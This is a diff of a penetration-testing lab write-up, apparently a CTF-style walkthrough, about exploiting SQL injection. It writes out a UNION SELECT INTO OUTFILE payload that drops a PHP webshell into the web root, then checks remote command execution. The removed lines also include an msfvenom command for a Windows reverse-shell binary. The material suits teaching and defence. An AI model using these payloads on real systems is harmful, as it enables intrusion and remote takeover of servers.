@@ -483,15 +483,17 @@ We are regular users, with restricted access to sensitive data and restricted pr
 ![](Images/Pasted%20image%2020221020192000.png)
 #sqlinjection 
 
-#### -As we confirmed previously the root directory of the target machine is "C:/xampp/htdocs" I typed ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' and request 
-#PHPwebshell #UNIONSELECTmysqlinjection
+- Entering the SQL query below, we click "Request" and a webshell is created that permits the execution of shell commands.
 
-#### - Received no error
+' UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -'
 
-#### - Created a reverse shell binary on my kali machine by typing "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.49.114 LPORT=8000"
+![[Pasted image 20240501180757.png]]
 
+- We try to access "192.168.224.127:33033/cmd.php?cmd=whoami" in order to verify Remote Command Execution, but nothing comes up.
 
-#### - Navigated to "192.168.114.127:45332/cmd.php?cmd=whoami" and confirmed we have remote code execution on the target machine
+# Port 45332
+
+- As port 45332 was identified by the previous NMAP scan findings as an HTTP Apache server, we try to access "192.168.224.127:45332/cmd.php?cmd=whoami" and verify RCE.
 
 ![](Images/Pasted%20image%2020221020192543.png)
 
